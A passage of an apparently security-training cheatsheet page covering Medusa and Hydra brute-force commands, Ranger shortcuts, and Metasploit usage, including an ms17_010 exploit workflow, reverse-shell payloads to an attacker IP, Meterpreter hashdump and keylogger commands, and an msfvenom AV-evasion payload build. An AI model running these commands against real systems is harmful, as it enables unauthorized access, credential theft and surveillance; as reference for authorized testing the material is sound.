<tr><td><code>-H FILE</code></td><td>Target: File containing list of targets</td><td><code>medusa -H targets.txt ...</code></td></tr>
<tr><td><code>-u USERNAME</code></td><td>Username: Single username</td><td><code>medusa -u admin ...</code></td></tr>
<tr><td><code>-U FILE</code></td><td>Username: File containing usernames</td><td><code>medusa -U usernames.txt ...</code></td></tr>
<tr><td><code>-p PASSWORD</code></td><td>Password: Single password</td><td><code>medusa -p password123 ...</code></td></tr>
<tr><td><code>-P FILE</code></td><td>Password: File containing passwords</td><td><code>medusa -P passwords.txt ...</code></td></tr>
<tr><td><code>-M MODULE</code></td><td>Module: Specific module to use</td><td><code>medusa -M ssh ...</code></td></tr>
<tr><td><code>-m "OPTION"</code></td><td>Module options: Additional parameters for module</td><td><code>medusa -M http -m "POST /login.php..."</code></td></tr>
<tr><td><code>-t TASKS</code></td><td>Tasks: Number of parallel login attempts</td><td><code>medusa -t 4 ...</code></td></tr>
<tr><td><code>-f</code></td><td>Fast mode: Stop after first success on current host</td><td><code>medusa -f ...</code></td></tr>
<tr><td><code>-F</code></td><td>Fast mode: Stop after first success on any host</td><td><code>medusa -F ...</code></td></tr>
<tr><td><code>-n PORT</code></td><td>Port: Specify non-default port</td><td><code>medusa -n 2222 ...</code></td></tr>
<tr><td><code>-v LEVEL</code></td><td>Verbose: Detailed output (0-6)</td><td><code>medusa -v 4 ...</code></td></tr>
<tr><td><code>-e ns</code></td><td>Empty/Default: Check empty (n) and same as username (s)</td><td><code>medusa -e ns ...</code></td></tr>
</tbody>
</table>
</div>
<h2 id="modules"><a class="header" href="#modules">Modules</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Module</th><th>Service/Protocol</th><th>Description</th><th>Usage Example</th></tr>
</thead>
<tbody>
<tr><td><code>ftp</code></td><td>File Transfer Protocol</td><td>Brute-force FTP login credentials</td><td><code>medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>http</code></td><td>Hypertext Transfer Protocol</td><td>Brute-force HTTP login forms (GET/POST)</td><td><code>medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&amp;password=^PASS^</code></td></tr>
<tr><td><code>imap</code></td><td>Internet Message Access Protocol</td><td>Brute-force IMAP logins for email servers</td><td><code>medusa -M imap -h mail.example.com -U users.txt -P passwords.txt</code></td></tr>
<tr><td><code>mysql</code></td><td>MySQL Database</td><td>Brute-force MySQL database credentials</td><td><code>medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt</code></td></tr>
<tr><td><code>pop3</code></td><td>Post Office Protocol 3</td><td>Brute-force POP3 logins for email retrieval</td><td><code>medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt</code></td></tr>
<tr><td><code>rdp</code></td><td>Remote Desktop Protocol</td><td>Brute-force RDP logins for Windows remote desktop</td><td><code>medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>ssh</code></td><td>Secure Shell (SSH)</td><td>Brute-force SSH logins for secure remote access</td><td><code>medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt</code></td></tr>
<tr><td><code>svn</code></td><td>Subversion (SVN)</td><td>Brute-force Subversion repositories</td><td><code>medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>telnet</code></td><td>Telnet Protocol</td><td>Brute-force Telnet services</td><td><code>medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr>
<tr><td><code>vnc</code></td><td>Virtual Network Computing</td><td>Brute-force VNC login credentials</td><td><code>medusa -M vnc -h 192.168.1.100 -P passwords.txt</code></td></tr>
<tr><td><code>web-form</code></td><td>Web Login Forms</td><td>Brute-force login forms using HTTP POST</td><td><code>medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&amp;password=^PASS^:F=Invalid"</code></td></tr>
</tbody>
</table>
</div>
<h2 id="useful-examples-1"><a class="header" href="#useful-examples-1">Useful Examples</a></h2>
<h3 id="ssh-brute-force-attack"><a class="header" href="#ssh-brute-force-attack">SSH Brute-Force Attack</a></h3>
<pre><code class="language-bash">medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh
</code></pre>
<h3 id="multiple-web-servers-with-basic-http-authentication"><a class="header" href="#multiple-web-servers-with-basic-http-authentication">Multiple Web Servers with Basic HTTP Authentication</a></h3>
<pre><code class="language-bash">medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET
</code></pre>
<h3 id="test-for-empty-or-default-passwords"><a class="header" href="#test-for-empty-or-default-passwords">Test for Empty or Default Passwords</a></h3>
<pre><code class="language-bash">medusa -h 10.0.0.5 -U usernames.txt -e ns -M ssh
</code></pre>
<h3 id="http-post-form-attack"><a class="header" href="#http-post-form-attack">HTTP POST Form Attack</a></h3>
<pre><code class="language-bash">medusa -M http -h www.example.com -U users.txt -P passwords.txt -m "POST /login.php HTTP/1.1\r\nContent-Length: 30\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=^USER^&amp;password=^PASS^"
</code></pre>
<h3 id="fast-mode-stop-on-first-success"><a class="header" href="#fast-mode-stop-on-first-success">Fast Mode (Stop on First Success)</a></h3>
<pre><code class="language-bash">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -f
</code></pre>
<h3 id="custom-port-ssh-attack"><a class="header" href="#custom-port-ssh-attack">Custom Port SSH Attack</a></h3>
<pre><code class="language-bash">medusa -h 192.168.1.100 -n 2222 -U usernames.txt -P passwords.txt -M ssh
</code></pre>
<h3 id="verbose-output"><a class="header" href="#verbose-output">Verbose Output</a></h3>
<pre><code class="language-bash">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -v 4
</code></pre>
<h3 id="parallel-tasks"><a class="header" href="#parallel-tasks">Parallel Tasks</a></h3>
<pre><code class="language-bash">medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh -t 8
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="hydra-cheatsheet"><a class="header" href="#hydra-cheatsheet">Hydra Cheatsheet</a></h1>
<h2 id="basic-syntax"><a class="header" href="#basic-syntax">Basic Syntax</a></h2>
<pre><code>hydra [login_options] [password_options] [attack_options] [service_options] service://server
</code></pre>
<hr>
<h2 id="login-options"><a class="header" href="#login-options">Login Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-l LOGIN</code></td><td>Single username</td><td><code>hydra -l admin ...</code></td></tr>
<tr><td><code>-L FILE</code></td><td>Username list file</td><td><code>hydra -L usernames.txt ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="password-options"><a class="header" href="#password-options">Password Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-p PASS</code></td><td>Single password</td><td><code>hydra -p password123 ...</code></td></tr>
<tr><td><code>-P FILE</code></td><td>Password list file</td><td><code>hydra -P passwords.txt ...</code></td></tr>
<tr><td><code>-x MIN:MAX:CHARSET</code></td><td>Generate passwords</td><td><code>hydra -x 6:8:aA1 ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="attack-options"><a class="header" href="#attack-options">Attack Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>-t TASKS</code></td><td>Number of parallel tasks (threads)</td><td><code>hydra -t 4 ...</code></td></tr>
<tr><td><code>-f</code></td><td>Stop after first successful login</td><td><code>hydra -f ...</code></td></tr>
<tr><td><code>-s PORT</code></td><td>Specify non-default port</td><td><code>hydra -s 2222 ...</code></td></tr>
<tr><td><code>-v</code></td><td>Verbose output</td><td><code>hydra -v ...</code></td></tr>
<tr><td><code>-V</code></td><td>Very verbose output</td><td><code>hydra -V ...</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="common-services"><a class="header" href="#common-services">Common Services</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Service</th><th>Protocol</th><th>Description</th><th>Example</th></tr>
</thead>
<tbody>
<tr><td><code>ftp</code></td><td>FTP</td><td>File Transfer Protocol</td><td><code>hydra -l admin -P passwords.txt ftp://192.168.1.100</code></td></tr>
<tr><td><code>ssh</code></td><td>SSH</td><td>Secure Shell</td><td><code>hydra -l root -P passwords.txt ssh://192.168.1.100</code></td></tr>
<tr><td><code>http-get</code></td><td>HTTP GET</td><td>Web login (GET)</td><td><code>hydra -l admin -P passwords.txt http-get://example.com/login</code></td></tr>
<tr><td><code>http-post</code></td><td>HTTP POST</td><td>Web login (POST)</td><td><code>hydra -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect"</code></td></tr>
<tr><td><code>smtp</code></td><td>SMTP</td><td>Email sending</td><td><code>hydra -l admin -P passwords.txt smtp://mail.server.com</code></td></tr>
<tr><td><code>pop3</code></td><td>POP3</td><td>Email retrieval</td><td><code>hydra -l user@example.com -P passwords.txt pop3://mail.server.com</code></td></tr>
<tr><td><code>imap</code></td><td>IMAP</td><td>Remote email access</td><td><code>hydra -l user@example.com -P passwords.txt imap://mail.server.com</code></td></tr>
<tr><td><code>rdp</code></td><td>RDP</td><td>Remote Desktop Protocol</td><td><code>hydra -l administrator -P passwords.txt rdp://192.168.1.100</code></td></tr>
<tr><td><code>telnet</code></td><td>Telnet</td><td>Remote terminal</td><td><code>hydra -l admin -P passwords.txt telnet://192.168.1.100</code></td></tr>
<tr><td><code>mysql</code></td><td>MySQL</td><td>Database</td><td><code>hydra -l root -P passwords.txt mysql://192.168.1.100</code></td></tr>
<tr><td><code>postgres</code></td><td>PostgreSQL</td><td>Database</td><td><code>hydra -l postgres -P passwords.txt postgres://192.168.1.100</code></td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="useful-examples-2"><a class="header" href="#useful-examples-2">Useful Examples</a></h2>
<h3 id="ssh-brute-force"><a class="header" href="#ssh-brute-force">SSH Brute Force</a></h3>
<pre><code>hydra -l root -P /path/to/passwords.txt -t 4 ssh://192.168.1.100
</code></pre>
<h3 id="ftp-brute-force"><a class="header" href="#ftp-brute-force">FTP Brute Force</a></h3>
<pre><code>hydra -L usernames.txt -P passwords.txt ftp://192.168.1.100
</code></pre>
<h3 id="http-post-form-attack-1"><a class="header" href="#http-post-form-attack-1">HTTP POST Form Attack</a></h3>
<pre><code>hydra -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect" 192.168.1.100
</code></pre>
<h3 id="rdp-with-password-generation"><a class="header" href="#rdp-with-password-generation">RDP with Password Generation</a></h3>
<pre><code>hydra -l administrator -x 6:8:aA1 rdp://192.168.1.100
</code></pre>
<h3 id="ssh-on-non-default-port"><a class="header" href="#ssh-on-non-default-port">SSH on Non-Default Port</a></h3>
<pre><code>hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100
</code></pre>
<h3 id="stop-after-first-success"><a class="header" href="#stop-after-first-success">Stop After First Success</a></h3>
<pre><code>hydra -l admin -P passwords.txt -f ssh://192.168.1.100
</code></pre>
<h3 id="verbose-output-1"><a class="header" href="#verbose-output-1">Verbose Output</a></h3>
<pre><code>hydra -l admin -P passwords.txt -v ssh://192.168.1.100
</code></pre>
<h3 id="rdp-with-custom-character-set"><a class="header" href="#rdp-with-custom-character-set">RDP with Custom Character Set</a></h3>
<pre><code>hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 rdp://192.168.1.100
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ranger-cheatsheet"><a class="header" href="#ranger-cheatsheet">Ranger Cheatsheet</a></h1>
<h2 id="general"><a class="header" href="#general">General</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>ranger</code></td><td>Start Ranger</td></tr>
<tr><td><code>Q</code></td><td>Quit Ranger</td></tr>
<tr><td><code>R</code></td><td>Reload current directory</td></tr>
<tr><td><code>?</code></td><td>Ranger Manpages / Shortcuts</td></tr>
</tbody>
</table>
</div>
<h2 id="movement"><a class="header" href="#movement">Movement</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>k</code></td><td>up</td></tr>
<tr><td><code>j</code></td><td>down</td></tr>
<tr><td><code>h</code></td><td>parent directory</td></tr>
<tr><td><code>l</code></td><td>subdirectory</td></tr>
<tr><td><code>gg</code></td><td>go to top of list</td></tr>
<tr><td><code>G</code></td><td>go t bottom of list</td></tr>
<tr><td><code>J</code></td><td>half page down</td></tr>
<tr><td><code>K</code></td><td>half page up</td></tr>
<tr><td><code>H</code></td><td>History Back</td></tr>
<tr><td><code>L</code></td><td>History Forward</td></tr>
<tr><td><code>~</code></td><td>Switch the view</td></tr>
</tbody>
</table>
</div>
<h2 id="file-operations"><a class="header" href="#file-operations">File Operations</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>&lt;Enter&gt;</code></td><td>Open</td></tr>
<tr><td><code>r</code></td><td>open file with</td></tr>
<tr><td><code>z</code></td><td>toggle settings</td></tr>
<tr><td><code>o</code></td><td>change sort order</td></tr>
<tr><td><code>zh</code></td><td>view hidden files</td></tr>
<tr><td><code>cw</code></td><td>rename current file</td></tr>
<tr><td><code>yy</code></td><td>yank / copy</td></tr>
<tr><td><code>dd</code></td><td>cut</td></tr>
<tr><td><code>pp</code></td><td>paste</td></tr>
<tr><td><code>/</code></td><td>search for files <code>:search</code></td></tr>
<tr><td><code>n</code></td><td>next match</td></tr>
<tr><td><code>N</code></td><td>prev match</td></tr>
<tr><td><code>&lt;delete&gt;</code></td><td>Delete</td></tr>
</tbody>
</table>
</div>
<h2 id="commands"><a class="header" href="#commands">Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>:</code></td><td>Execute Range Command</td></tr>
<tr><td><code>!</code></td><td>Execute Shell Command</td></tr>
<tr><td><code>chmod</code></td><td>Change file Permissions</td></tr>
<tr><td><code>du</code></td><td>Disk Usage Current Directory</td></tr>
<tr><td><code>S</code></td><td>Run the terminal in your current ranger window (exit to go back to ranger)</td></tr>
</tbody>
</table>
</div>
<h2 id="tabs"><a class="header" href="#tabs">Tabs</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>C-n</code></td><td>Create new tab</td></tr>
<tr><td><code>C-w</code></td><td>Close current tab</td></tr>
<tr><td>tab</td><td>Next tab</td></tr>
<tr><td>shift + tab</td><td>Previous tab</td></tr>
<tr><td>alt + [n]</td><td>goto / create [n] tab</td></tr>
</tbody>
</table>
</div>
<h2 id="file-substituting"><a class="header" href="#file-substituting">File substituting</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>%f</code></td><td>Substitute highlighted file</td></tr>
<tr><td><code>%d</code></td><td>Substitute current directory</td></tr>
<tr><td><code>%s</code></td><td>Substitute currently selected files</td></tr>
<tr><td><code>%t</code></td><td>Substitute currently tagged files</td></tr>
</tbody>
</table>
</div>
<h3 id="example-for-substitution"><a class="header" href="#example-for-substitution">Example for substitution</a></h3>
<p><code>:bulkrename %s</code></p>
<h2 id="marker"><a class="header" href="#marker">Marker</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Shortcut</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>m  + &lt;letter&gt;</code></td><td>Create Marker</td></tr>
<tr><td><code>um  + &lt;letter&gt;</code></td><td>Delete Marker</td></tr>
<tr><td><code>'  + &lt;letter&gt;</code></td><td>Go to Marker</td></tr>
<tr><td><code>t</code></td><td>tag a file with an *</td></tr>
<tr><td><code>t"&lt;any&gt;</code></td><td>tag a file with your desired mark</td></tr>
</tbody>
</table>
</div>
<p><em>thx to the comments section for additional shortcuts! post your suggestions there!</em></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="metasploit-cheatsheet"><a class="header" href="#metasploit-cheatsheet">Metasploit Cheatsheet</a></h1>
<h2 id="module-structure"><a class="header" href="#module-structure">Module Structure</a></h2>
<pre><code>&lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;
</code></pre>
<p>Example: <code>794 exploit/windows/ftp/scriptftp_list</code></p>
<hr>
<h2 id="module-types"><a class="header" href="#module-types">Module Types</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Type</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>Auxiliary</strong></td><td>Scanning, fuzzing, sniffing, and admin capabilities</td></tr>
<tr><td><strong>Encoders</strong></td><td>Ensure payloads are intact to their destination</td></tr>
<tr><td><strong>Exploits</strong></td><td>Modules that exploit vulnerabilities for payload delivery</td></tr>
<tr><td><strong>NOPs</strong></td><td>Keep payload sizes consistent across exploit attempts</td></tr>
<tr><td><strong>Payloads</strong></td><td>Code that runs remotely and calls back to attacker</td></tr>
<tr><td><strong>Plugins</strong></td><td>Additional scripts integrated within msfconsole</td></tr>
<tr><td><strong>Post</strong></td><td>Wide array of modules to gather information, pivot deeper</td></tr>
</tbody>
</table>
</div>
<p><strong>Note:</strong> Only <code>auxiliary</code>, <code>exploits</code>, and <code>post</code> modules can be used with <code>use &lt;no.&gt;</code> command.</p>
<hr>
<h2 id="searching-modules"><a class="header" href="#searching-modules">Searching Modules</a></h2>
<h3 id="basic-search"><a class="header" href="#basic-search">Basic Search</a></h3>
<pre><code class="language-bash">search &lt;keyword&gt;
search eternalromance
</code></pre>
<h3 id="advanced-search-options"><a class="header" href="#advanced-search-options">Advanced Search Options</a></h3>
<pre><code class="language-bash">search cve:2009 type:exploit
search cve:2009 type:exploit platform:-linux
search type:exploit platform:windows cve:2021 rank:excellent microsoft
</code></pre>
<h3 id="search-keywords"><a class="header" href="#search-keywords">Search Keywords</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Keyword</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>cve</code></td><td>Modules with matching CVE ID</td></tr>
<tr><td><code>type</code></td><td>Module type (exploit, payload, auxiliary, etc.)</td></tr>
<tr><td><code>platform</code></td><td>Target OS/platform</td></tr>
<tr><td><code>rank</code></td><td>Exploitability rank (excellent, good, normal, etc.)</td></tr>
<tr><td><code>port</code></td><td>Target port number</td></tr>
<tr><td><code>author</code></td><td>Module author</td></tr>
<tr><td><code>name</code></td><td>Module name</td></tr>
</tbody>
</table>
</div>
<h3 id="search-options"><a class="header" href="#search-options">Search Options</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>-h</code></td><td>Show help information</td></tr>
<tr><td><code>-o &lt;file&gt;</code></td><td>Output results to CSV file</td></tr>
<tr><td><code>-S &lt;string&gt;</code></td><td>Regex pattern to filter results</td></tr>
<tr><td><code>-u</code></td><td>Use module if there is one result</td></tr>
<tr><td><code>-s &lt;column&gt;</code></td><td>Sort by column (rank, date, name, type, check)</td></tr>
<tr><td><code>-r</code></td><td>Reverse sort order</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="module-selection--usage"><a class="header" href="#module-selection--usage">Module Selection &amp; Usage</a></h2>
<h3 id="select-module"><a class="header" href="#select-module">Select Module</a></h3>
<pre><code class="language-bash">use &lt;module_number&gt;
use exploit/windows/smb/ms17_010_psexec
</code></pre>
<h3 id="view-module-options"><a class="header" href="#view-module-options">View Module Options</a></h3>
<pre><code class="language-bash">show options
</code></pre>
<h3 id="set-required-options"><a class="header" href="#set-required-options">Set Required Options</a></h3>
<pre><code class="language-bash">set RHOSTS &lt;target_ip&gt;
set RHOSTS 10.10.10.40
setg LHOST &lt;attacker_ip&gt;    # Global setting
set LPORT 4444
</code></pre>
<h3 id="view-payloads"><a class="header" href="#view-payloads">View Payloads</a></h3>
<pre><code class="language-bash">show payloads
</code></pre>
<h3 id="set-payload"><a class="header" href="#set-payload">Set Payload</a></h3>
<pre><code class="language-bash">set payload windows/meterpreter/reverse_tcp
</code></pre>
<h3 id="execute-exploit"><a class="header" href="#execute-exploit">Execute Exploit</a></h3>
<pre><code class="language-bash">run
exploit
</code></pre>
<hr>
<h2 id="common-options"><a class="header" href="#common-options">Common Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>RHOSTS</code></td><td>Target host(s) - required for most modules</td></tr>
<tr><td><code>RHOST</code></td><td>Single target host</td></tr>
<tr><td><code>RPORT</code></td><td>Target port (TCP)</td></tr>
<tr><td><code>LHOST</code></td><td>Attacker‚Äôs IP address (for reverse shells)</td></tr>
<tr><td><code>LPORT</code></td><td>Attacker‚Äôs listening port</td></tr>
<tr><td><code>PAYLOAD</code></td><td>Payload to use</td></tr>
<tr><td><code>TARGET</code></td><td>Target OS/architecture</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="useful-commands"><a class="header" href="#useful-commands">Useful Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>help</code></td><td>Show help menu</td></tr>
<tr><td><code>help search</code></td><td>Search command help</td></tr>
<tr><td><code>info &lt;module&gt;</code></td><td>Detailed module information</td></tr>
<tr><td><code>check</code></td><td>Test if target is vulnerable (if supported)</td></tr>
<tr><td><code>sessions</code></td><td>List active sessions</td></tr>
<tr><td><code>sessions -i &lt;id&gt;</code></td><td>Interact with session</td></tr>
<tr><td><code>background</code></td><td>Background current session</td></tr>
<tr><td><code>setg</code></td><td>Set global option (persists across modules)</td></tr>
<tr><td><code>unsetg</code></td><td>Unset global option</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="example-workflow"><a class="header" href="#example-workflow">Example Workflow</a></h2>
<pre><code class="language-bash"># Start msfconsole
msfconsole

# Search for exploit
search ms17_010

# Select module
use exploit/windows/smb/ms17_010_psexec

# View options
show options

# Set target
set RHOSTS 10.10.10.40

# Set payload options
setg LHOST 10.10.14.15
set LPORT 4444

# Check vulnerability (if supported)
check

# Run exploit
run
</code></pre>
<hr>
<h2 id="rank-levels"><a class="header" href="#rank-levels">Rank Levels</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Rank</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><strong>excellent</strong></td><td>Exploit will never crash the service</td></tr>
<tr><td><strong>great</strong></td><td>Exploit has a default target and auto-detects the target</td></tr>
<tr><td><strong>good</strong></td><td>Exploit has a default target</td></tr>
<tr><td><strong>normal</strong></td><td>Exploit is otherwise reliable</td></tr>
<tr><td><strong>average</strong></td><td>Exploit is generally unreliable</td></tr>
<tr><td><strong>low</strong></td><td>Exploit is nearly impossible to exploit</td></tr>
<tr><td><strong>manual</strong></td><td>Exploit is unstable or difficult to exploit</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="targets-1"><a class="header" href="#targets-1">Targets</a></h2>
<p>Targets are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version.</p>
<h3 id="view-targets"><a class="header" href="#view-targets">View Targets</a></h3>
<pre><code class="language-bash"># From root menu (requires exploit selected first)
msf6 &gt; show targets
[-] No exploit module selected.

# From within an exploit module
msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets
</code></pre>
<h3 id="select-a-target"><a class="header" href="#select-a-target">Select a Target</a></h3>
<pre><code class="language-bash">msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; set target 6
target =&gt; 6
</code></pre>
<h3 id="example-target-list"><a class="header" href="#example-target-list">Example Target List</a></h3>
<pre><code>Exploit targets:
   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
</code></pre>
<p><strong>Note:</strong> Setting target to <code>Automatic</code> lets msfconsole perform service detection before launching the attack.</p>
<h3 id="target-identification"><a class="header" href="#target-identification">Target Identification</a></h3>
<p>To identify a target correctly:</p>
<ol>
<li>Obtain a copy of the target binaries</li>
<li>Use <code>msfpescan</code> to locate a suitable return address</li>
</ol>
<hr>
<h2 id="payloads-detailed"><a class="header" href="#payloads-detailed">Payloads (Detailed)</a></h2>
<p>Payloads are modules that aid the exploit module in returning a shell to the attacker.</p>
<h3 id="payload-types"><a class="header" href="#payload-types">Payload Types</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Notation</th><th>Type</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>windows/shell_bind_tcp</code></td><td>Single</td><td>No stage, self-contained payload</td></tr>
<tr><td><code>windows/shell/bind_tcp</code></td><td>Staged</td><td>Stager (bind_tcp) + Stage (shell)</td></tr>
</tbody>
</table>
</div>
<h3 id="singles"><a class="header" href="#singles">Singles</a></h3>
<ul>
<li>Self-contained payloads with exploit and entire shellcode</li>
<li>More stable but larger in size</li>
<li>Result immediately after execution</li>
<li>Example: Adding a user or starting a process</li>
</ul>
<h3 id="stagers"><a class="header" href="#stagers">Stagers</a></h3>
<ul>
<li>Wait on attacker machine for connection</li>
<li>Small and reliable</li>
<li>Set up network connection between attacker and victim</li>
<li>Examples: <code>reverse_tcp</code>, <code>reverse_https</code>, <code>bind_tcp</code></li>
</ul>
<h3 id="stages"><a class="header" href="#stages">Stages</a></h3>
<ul>
<li>Downloaded by stager modules</li>
<li>Provide advanced features with no size limits</li>
<li>Examples: Meterpreter, VNC Injection</li>
</ul>
<h3 id="list-payloads"><a class="header" href="#list-payloads">List Payloads</a></h3>
<pre><code class="language-bash">msf6 &gt; show payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter show payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads
</code></pre>
<h3 id="select-payload"><a class="header" href="#select-payload">Select Payload</a></h3>
<pre><code class="language-bash">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15
# or
msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp
</code></pre>
<h3 id="common-windows-payloads"><a class="header" href="#common-windows-payloads">Common Windows Payloads</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Payload</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>generic/shell_bind_tcp</code></td><td>Generic listener, normal shell, TCP bind</td></tr>
<tr><td><code>generic/shell_reverse_tcp</code></td><td>Generic listener, normal shell, reverse TCP</td></tr>
<tr><td><code>windows/x64/exec</code></td><td>Executes an arbitrary command</td></tr>
<tr><td><code>windows/x64/shell_reverse_tcp</code></td><td>Normal shell, single payload, reverse TCP</td></tr>
<tr><td><code>windows/x64/shell/reverse_tcp</code></td><td>Normal shell, stager + stage, reverse TCP</td></tr>
<tr><td><code>windows/x64/meterpreter/$</code></td><td>Meterpreter payload + varieties</td></tr>
<tr><td><code>windows/x64/powershell/$</code></td><td>Interactive PowerShell sessions</td></tr>
<tr><td><code>windows/x64/vncinject/$</code></td><td>VNC Server (Reflective Injection)</td></tr>
</tbody>
</table>
</div>
<h3 id="meterpreter-commands"><a class="header" href="#meterpreter-commands">Meterpreter Commands</a></h3>
<pre><code class="language-bash">meterpreter &gt; help           # Show all commands
meterpreter &gt; getuid         # Get current user
meterpreter &gt; sysinfo        # System information
meterpreter &gt; shell          # Drop to system shell
meterpreter &gt; hashdump       # Dump SAM database
meterpreter &gt; screenshot     # Capture screenshot
meterpreter &gt; keyscan_start  # Start keylogger
meterpreter &gt; background     # Background session
</code></pre>
<hr>
<h2 id="encoders"><a class="header" href="#encoders">Encoders</a></h2>
<p>Encoders change payloads to run on different architectures and help with AV evasion.</p>
<h3 id="supported-architectures"><a class="header" href="#supported-architectures">Supported Architectures</a></h3>
<ul>
<li>x64, x86, sparc, ppc, mips</li>
</ul>
<h3 id="list-encoders"><a class="header" href="#list-encoders">List Encoders</a></h3>
<pre><code class="language-bash">msf6 &gt; show encoders
</code></pre>
<h3 id="common-encoders"><a class="header" href="#common-encoders">Common Encoders</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Encoder</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>x86/shikata_ga_nai</code></td><td>Polymorphic XOR Additive Feedback Encoder</td></tr>
<tr><td><code>x64/xor</code></td><td>XOR Encoder</td></tr>
<tr><td><code>x64/zutto_dekiru</code></td><td>Zutto Dekiru</td></tr>
<tr><td><code>x86/alpha_mixed</code></td><td>Alpha2 Alphanumeric Mixedcase Encoder</td></tr>
<tr><td><code>x86/unicode_mixed</code></td><td>Alpha2 Alphanumeric Unicode Mixedcase Encoder</td></tr>
</tbody>
</table>
</div>
<h3 id="generate-encoded-payload-with-msfvenom"><a class="header" href="#generate-encoded-payload-with-msfvenom">Generate Encoded Payload with msfvenom</a></h3>
<pre><code class="language-bash"># Single iteration
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o payload.exe

# Multiple iterations (10)
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
